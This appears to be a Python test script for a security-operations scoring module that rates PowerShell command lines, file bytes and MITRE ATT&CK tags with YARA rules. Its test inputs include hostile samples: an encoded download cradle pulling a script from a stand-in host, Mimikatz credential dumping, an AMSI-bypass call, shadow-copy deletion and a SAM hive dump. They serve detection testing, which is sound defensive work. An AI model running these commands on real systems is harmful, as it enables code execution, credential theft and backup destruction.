import base64
import behavior

behavior.YARA_RULES_PATH = "/tmp/re_test"   # point at rules.yar for local test


def enc(ps):
    return base64.b64encode(ps.encode("utf-16-le")).decode()


def check(name, got, expect):
    ok = got == expect
    print(f"[{'PASS' if ok else 'FAIL'}] {name}: got={got} expect={expect}")
    return ok


results = []

# 1) Benign encoded — the user's REAL event (whoami; hostname)
cl1 = ('"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
       '-noprofile -encodedcommand dwBoAG8AYQBtAGkAOwAgAGgAbwBzAHQAbgBhAG0AZQA=')
b1 = behavior.compute_behavior(cl1)
print("  decoded1:", repr(b1["decoded_preview"]), "matches:", b1["yara_matches"])
results.append(check("benign-encoded score", b1["behavior_score"], 50))
results.append(check("benign-encoded floor", behavior.behavior_floor(b1["behavior_score"]), 50))

# 2) Malicious download cradle, encoded + hidden flags
cl2 = "powershell.exe -nop -w hidden -enc " + enc(
    "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/p.ps1')")
b2 = behavior.compute_behavior(cl2)
print("  matches2:", b2["yara_matches"], "techniques:", b2["techniques"])
results.append(check("cradle score", b2["behavior_score"], 75))
results.append(check("cradle floor", behavior.behavior_floor(b2["behavior_score"]), 75))

# 3) AMSI bypass (critical)
cl3 = "powershell -enc " + enc(
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")
b3 = behavior.compute_behavior(cl3)
results.append(check("amsi score", b3["behavior_score"], 90))
results.append(check("amsi floor", behavior.behavior_floor(b3["behavior_score"]), 90))

# 4) Mimikatz
cl4 = "powershell -enc " + enc("Invoke-Mimikatz -DumpCreds")
b4 = behavior.compute_behavior(cl4)
results.append(check("mimikatz score", b4["behavior_score"], 95))
results.append(check("mimikatz floor", behavior.behavior_floor(b4["behavior_score"]), 90))

# 5) Non-encoded benign command — must stay 0 (preserve existing behavior)
b5 = behavior.compute_behavior('"C:\\Windows\\notepad.exe"')
results.append(check("benign-plain score", b5["behavior_score"], 0))
results.append(check("benign-plain floor", behavior.behavior_floor(b5["behavior_score"]), 0))

# 6) sha256 extraction from real Sysmon eventchannel combined hashes
f6 = {"data": {"win": {"eventdata": {"hashes":
      "MD5=A97E6573B97B44C96122BFA543A82EA1,"
      "SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,"
      "IMPHASH=AFACF6DC9041114B198160AAB4D0AE77"}}}}
results.append(check("sha256 eventchannel", behavior._extract_sha256(f6),
                     "0ff6f2c94bc7e2833a5f7e16de1622e5dba70396f31c7d5f56381870317e8c46"))

# 7) sha256 extraction from syslog-style split field
f7 = {"data": {"hash_sha256":
      "ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789"}}
results.append(check("sha256 syslog", behavior._extract_sha256(f7),
                     "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"))

# 8) Unsubstituted Shuffle var must NOT be treated as a hash
f8 = {"data": {"hash_sha256": "$exec.all_fields.data.hash_sha256"}}
results.append(check("sha256 unsubstituted", behavior._extract_sha256(f8), ""))

# 8b) Wazuh FIM 'file added' (syscheck.sha256_after) — NO agent script needed.
f8b = {"syscheck": {"path": "C:\\Windows\\Temp\\a.exe",
       "sha256_after": "1111111111111111111111111111111111111111111111111111111111111111"}}
results.append(check("sha256 FIM syscheck", behavior._extract_sha256(f8b),
                     "1111111111111111111111111111111111111111111111111111111111111111"))

# 8c) File-drop collector direct field (data.sha256)
f8c = {"data": {"sha256": "2222222222222222222222222222222222222222222222222222222222222222"}}
results.append(check("sha256 collector", behavior._extract_sha256(f8c),
                     "2222222222222222222222222222222222222222222222222222222222222222"))

# 9) Non-encoded but suspicious flags (legit-ish admin script) → score 40.
# With the [40,20] reviewed tier this now floors at 20 (reviewed) — intended:
# low-confidence TTPs are surfaced to the analyst, never auto-actioned.
b9 = behavior.compute_behavior('powershell.exe -noprofile -w hidden -File C:\\setup.ps1')
print("  matches9:", b9["yara_matches"])
results.append(check("flags-only score", b9["behavior_score"], 40))
results.append(check("flags-only floor (reviewed)", behavior.behavior_floor(b9["behavior_score"]), 20))

# ── MITRE ATT&CK scoring (Phase 9.1) ─────────────────────────────────────────
# 10) The user's REAL schtasks event: rule 92032, mitre.id [T1087,T1059.003],
#     tactic [Discovery,Execution]. No command_line behavioral hit needed —
#     MITRE alone → max(T1087=40,T1059.003=40,Discovery=35,Execution=45)=45 → reviewed.
b10 = behavior.compute_behavior("", ["T1087", "T1059.003"], ["Discovery", "Execution"])
print("  mitre10:", b10["mitre_score"], b10["techniques"])
results.append(check("schtasks-mitre score", b10["behavior_score"], 45))
results.append(check("schtasks-mitre floor (reviewed)", behavior.behavior_floor(b10["behavior_score"]), 20))

# 11) Credential dumping technique → escalate
b11 = behavior.compute_behavior("", ["T1003.001"], ["Credential Access"])
results.append(check("creddump-mitre score", b11["behavior_score"], 90))
results.append(check("creddump-mitre floor (escalate)", behavior.behavior_floor(b11["behavior_score"]), 90))

# 12) Pure recon → reviewed (visible, no auto-action)
b12 = behavior.compute_behavior("", ["T1087"], ["Discovery"])
results.append(check("recon-mitre score", b12["behavior_score"], 40))
results.append(check("recon-mitre floor (reviewed)", behavior.behavior_floor(b12["behavior_score"]), 20))

# 13) Sub-technique not in map falls back to base technique (T1003.999 → T1003=90)
b13 = behavior.compute_behavior("", ["T1003.999"], [])
results.append(check("subtech-fallback score", b13["behavior_score"], 90))

# 14) Unknown technique with known tactic → tactic fallback (Impact=90)
b14 = behavior.compute_behavior("", ["T9999"], ["Impact"])
results.append(check("tactic-fallback score", b14["behavior_score"], 90))

# 15) Unsubstituted Shuffle vars → MITRE score 0 (no false floor)
b15 = behavior.compute_behavior("", "$exec.all_fields.rule.mitre.id",
                                "$exec.all_fields.rule.mitre.tactic")
results.append(check("mitre-unsubstituted score", b15["behavior_score"], 0))

# 16) No MITRE, no command → 0 (preserve baseline)
b16 = behavior.compute_behavior("")
results.append(check("no-signal score", b16["behavior_score"], 0))

# 17) HYBRID — YARA raises above an under-classified MITRE tag.
#     Generic "T1059 execution" (45) but the command_line hides mimikatz (95).
b17 = behavior.compute_behavior("powershell -enc " + enc("Invoke-Mimikatz -DumpCreds"),
                                ["T1059.001"], ["Execution"])
results.append(check("hybrid yara>mitre score", b17["behavior_score"], 95))
results.append(check("hybrid yara>mitre floor (escalate)",
                     behavior.behavior_floor(b17["behavior_score"]), 90))

# ── LOLBin YARA ruleset (Phase 9.1, requires yara + soc-lolbin-behavior.yar) ──
# 18) schtasks persistence via command_line YARA (no MITRE) → 50 → auto_promoted
#     (score bumped 45→50 in commit 43b2baa: schtasks/runkey auto_promoted)
b18 = behavior.compute_behavior(
    'SCHTASKS  /Create /S localhost /RU DOMAIN\\user /RP At0micStrong '
    '/TN "Atomic task" /TR "C:\\windows\\system32\\cmd.exe" /SC daily /ST 20:10')
print("  matches18:", b18["yara_matches"])
results.append(check("lolbin-schtasks score", b18["behavior_score"], 50))

# 19) vssadmin shadow delete → critical → escalate
b19 = behavior.compute_behavior("vssadmin delete shadows /all /quiet")
print("  matches19:", b19["yara_matches"])
results.append(check("lolbin-vssadmin score", b19["behavior_score"], 90))

# 20) reg save SAM hive dump → critical
b20 = behavior.compute_behavior("reg save hklm\\sam C:\\temp\\sam.hive")
results.append(check("lolbin-reghive score", b20["behavior_score"], 90))

# ── Phase 9.2 — file-drop / shimming categorization ──────────────────────────
# NB on MITRE: _mitre_score is intentionally CONSERVATIVE — max(techniques+tactics)
# (case #10 relies on this). So a technique pin only wins when the tactic is absent
# or lower. T1546.011=45 de-noises shimming ONLY for rules that emit just the id.

# 21a) Native shim, rule emits MITRE id WITHOUT a tactic → T1546.011=45 alone →
#      behavior 45 → floor 20 → REVIEWED (visible, no case). The de-noise win for
#      id-only rules: previously base T1546=55 floored at 50 → auto_promoted.
b21 = behavior.compute_behavior(
    r"C:\Windows\System32\sdbinst.exe -q C:\Windows\AppPatch\Custom\app.sdb",
    ["T1546.011"], [])
print("  matches21:", b21["yara_matches"], "score:", b21["behavior_score"])
results.append(check("shim-native id-only score", b21["behavior_score"], 45))
results.append(check("shim-native id-only floor (reviewed)",
                     behavior.behavior_floor(b21["behavior_score"]), 20))

# 21b) Same native shim but the rule ALSO tags the Persistence tactic (50). The
#      conservative floor wins → 50 → auto_promoted (a low-priority case, tagged
#      shimming). Honest limitation: pure MITRE cannot push this below the tactic
#      floor; true silencing would need Wazuh-level suppression (declined).
b21b = behavior.compute_behavior(
    r"C:\Windows\System32\sdbinst.exe -q C:\Windows\AppPatch\Custom\app.sdb",
    ["T1546.011"], ["Persistence"])
results.append(check("shim-native +tactic score", b21b["behavior_score"], 50))

# 22) ABUSIVE shim: sdbinst installing a .sdb from a user-writable path → YARA
#     Application_Shimming_Suspicious=60 → floor 50 → auto_promoted (case).
b22 = behavior.compute_behavior(
    r"sdbinst.exe -q C:\Users\bob\AppData\Local\Temp\evil.sdb",
    ["T1546.011"], ["Persistence"])
print("  matches22:", b22["yara_matches"], "score:", b22["behavior_score"])
results.append(check("shim-abusive score", b22["behavior_score"], 60))
results.append(check("shim-abusive floor (auto_promoted)",
                     behavior.behavior_floor(b22["behavior_score"]), 50))

# 23) Local file-drop WITHOUT a download cradle: WriteAllBytes a PE into System32
#     (e.g. self-unpacking malware). PS_Download_Cradle does NOT fire (no net) →
#     the NEW Dropper_Executable_In_System_Dir=65 is the categorizing signal →
#     floor 50 → auto_promoted. This is the genuine coverage gap this rule fills.
b23 = behavior.compute_behavior(
    r"powershell -nop -c [IO.File]::WriteAllBytes('C:\Windows\System32\svc2.exe',$bytes)")
print("  matches23:", b23["yara_matches"], "score:", b23["behavior_score"])
results.append(check("dropper-windir-nonet score", b23["behavior_score"], 65))
results.append(check("dropper-windir-nonet floor (auto_promoted)",
                     behavior.behavior_floor(b23["behavior_score"]), 50))

# 24) Download-based drop into a Windows dir → both Dropper_Executable_In_System_Dir
#     (65) AND the pre-existing PS_Download_Cradle (75) fire → max 75 → contained.
#     The download cradle dominates; the drop rule adds the system-dir tag/context.
b24 = behavior.compute_behavior(
    r"powershell -nop -c (New-Object Net.WebClient)."
    r"DownloadFile('http://x/a.exe','C:\Windows\Temp\a.exe')")
print("  matches24:", b24["yara_matches"], "score:", b24["behavior_score"])
results.append(check("dropper-windir-download score", b24["behavior_score"], 75))
results.append(check("dropper-windir-download floor (contained)",
                     behavior.behavior_floor(b24["behavior_score"]), 75))

# ── Phase 9.2 — compute_behavior_bytes (/analyze-file raw-bytes scan) ─────────
# 25) Binary PE with injection imports → YARA on BYTES matches (a utf-8 decode
#     would have mangled it) → 70 → contained verdict.
pe_inject = (b"MZ" + b"\x90" * 64 + b"PE\x00\x00" +
             b"....VirtualAllocEx....WriteProcessMemory....CreateRemoteThread....")
b25 = behavior.compute_behavior_bytes(pe_inject)
print("  bytes25:", b25["yara_matches"], "score:", b25["behavior_score"])
results.append(check("filebytes-pe-inject score", b25["behavior_score"], 70))
results.append(check("filebytes-pe-inject floor (contained)",
                     behavior.behavior_floor(b25["behavior_score"]), 75))

# 26) Clean PE (no suspicious strings) → 0 → auto_closed verdict (SOAR closes it).
pe_clean = b"MZ" + b"\x00" * 200 + b"Microsoft Corporation\x00msvcrt.dll\x00printf\x00"
b26 = behavior.compute_behavior_bytes(pe_clean)
print("  bytes26:", b26["yara_matches"], "score:", b26["behavior_score"])
results.append(check("filebytes-pe-clean score", b26["behavior_score"], 0))
results.append(check("filebytes-pe-clean floor (auto_closed)",
                     behavior.behavior_floor(b26["behavior_score"]), 0))

# 27) Script dropper file content (text bytes) → embedded dropper + download cradle
#     fire → 75 → contained.
b27 = behavior.compute_behavior_bytes(
    b"$b=[Convert]::FromBase64String($enc); "
    b"IEX (New-Object Net.WebClient).DownloadString('http://x/p.ps1')")
print("  bytes27:", b27["yara_matches"], "score:", b27["behavior_score"])
results.append(check("filebytes-script-dropper score", b27["behavior_score"], 75))

# 28) Round-trip through the /analyze-file decode path: base64 → bytes → scan.
import base64 as _b64
b28 = behavior.compute_behavior_bytes(_b64.b64decode(_b64.b64encode(pe_inject)))
results.append(check("filebytes-b64-roundtrip score", b28["behavior_score"], 70))

# ── Phase 10 / POLICY 3.0 — _evidence_floor : un TAG MITRE ne contient jamais seul ──
# La décision /score utilise désormais _evidence_floor(content, mitre) : le CONTENU
# (YARA/encoded) garde toute la plage ; le TAG MITRE seul est plafonné à auto_promote.
ef = behavior._evidence_floor

# 29) Tag MITRE seul (ex. T1105=70, le cas mimikatz-par-tag) → plafonné à 50
#     (auto_promoted, cas créé, PAS d'AR) au lieu de 75 (contained).
results.append(check("evidence: tag T1105 seul -> auto_promote cap", ef(0, 70), 50))
# 30) Tag MITRE 'critique' seul (T1003.001=90) → toujours plafonné à 50 (pas escalate
#     sur un simple tag — il faut le CONTENU ou un hit Cortex/MISP).
results.append(check("evidence: tag cred-access seul -> cap 50", ef(0, 90), 50))
# 31) CONTENU malveillant (YARA mimikatz=95) → NON plafonné → 90 (escalated). C'est
#     l'analyse réelle qui autorise l'escalade.
results.append(check("evidence: contenu YARA 95 -> escalate 90", ef(95, 0), 90))
# 32) Contenu modéré (YARA 70) + tag faible → le contenu décide (75 contained).
results.append(check("evidence: contenu 70 -> contained 75", ef(70, 30), 75))
# 33) Contenu nul + tag faible (recon T1087=40) → tag plancher 20 (reviewed), < cap.
results.append(check("evidence: tag faible -> reviewed 20", ef(0, 40), 20))
# 34) Contenu < tag : max des deux planchers, mitre toujours capé.
#     content=50 -> floor 50 ; mitre=90 -> capé 50 ; max=50.
results.append(check("evidence: content 50 vs tag capé -> 50", ef(50, 90), 50))

# ── Phase 10 / A1 — extraction universelle : validation IP/domaine ───────────
ci, cd = behavior._clean_ip, behavior._clean_domain
# 35) IP routable conservée ; loopback/unsubstitué/garbage rejetés.
results.append(check("ip: routable", ci("8.8.8.8"), "8.8.8.8"))
results.append(check("ip: loopback rejeté", ci("127.0.0.1"), ""))
results.append(check("ip: unsubstitué rejeté", ci("$exec.all_fields.data.dstip"), ""))
results.append(check("ip: garbage rejeté", ci("not-an-ip"), ""))
# 36) Domaine FQDN normalisé ; IP/host-sans-point/unsubstitué rejetés.
results.append(check("domain: fqdn", cd("Evil.COM."), "evil.com"))
results.append(check("domain: ip rejetée", cd("8.8.8.8"), ""))
results.append(check("domain: host sans point rejeté", cd("localhost"), ""))
results.append(check("domain: unsubstitué rejeté", cd("$exec.all_fields.data.url"), ""))

# ── Phase 10 / B — registre evidence-grade (allowlist haute-fidélité) ─────────
eg = behavior._evidence_grade_score
# 37) Lookup registre : rule curée -> sévérité ; inconnue/unsubstituée -> 0.
results.append(check("evidence-grade: rule curée (100210)", eg("100210"), 90))
results.append(check("evidence-grade: rule LSASS dump (100215)", eg("100215"), 95))
results.append(check("evidence-grade: rule inconnue -> 0", eg("99999"), 0))
results.append(check("evidence-grade: unsubstitué -> 0", eg("$exec.all_fields.rule.id"), 0))
results.append(check("evidence-grade: int accepté", eg(100210), 90))
# 38) Fold dans _evidence_floor : une rule haute-fidélité (95) SANS IOC → escalate (90).
#     C'est l'allowlist Q1 : la détection EST la preuve, pas besoin d'enrichissement.
results.append(check("evidence: rule curée 95 (no IOC) -> escalate 90",
                     ef(max(0, eg("100215")), 0), 90))
# 39) Une rule curée 'persistence' (100217=60) seule → auto_promote 50.
results.append(check("evidence: rule curée 60 -> auto_promote 50",
                     ef(max(0, eg("100217")), 0), 50))
# 40) Rule GÉNÉRIQUE (hors registre, eg=0) + tag MITRE T1105=70 → reste capé à 50.
#     La distinction clé : règle curée = preuve (escalade) ; règle générique = tag (capé).
results.append(check("evidence: rule générique + tag -> capé 50",
                     ef(max(0, eg("92205")), 70), 50))

# ── Phase 10 / D — plancher d'enrichissement (IOC malveillant confirmé = preuve) ──
es = behavior._enrichment_score
# 41) Cortex malicious(3) seul -> 75 (contained) : un IOC malveillant n'est plus dilué.
results.append(check("enrich-floor: cortex malicious -> 75", es(3, False), 75))
# 42) MISP hit seul -> 75 (contained).
results.append(check("enrich-floor: misp hit -> 75", es(0, True), 75))
# 43) Cortex malicious + MISP -> 90 (escalated, corroboré).
results.append(check("enrich-floor: cortex+misp -> 90", es(3, True), 90))
# 44) Cortex suspicious(2) -> 50 (auto_promote, pas de containment auto).
results.append(check("enrich-floor: suspicious -> 50", es(2, False), 50))
# 45) Rien -> 0 (pas de plancher).
results.append(check("enrich-floor: clean -> 0", es(0, False), 0))
# 46) Le plancher d'enrichissement passe par _evidence_floor (côté contenu) -> contained.
results.append(check("enrich via evidence_floor -> contained",
                     ef(es(3, False), 0), 75))

print(f"\n{sum(results)}/{len(results)} PASS")
exit(0 if all(results) else 1)
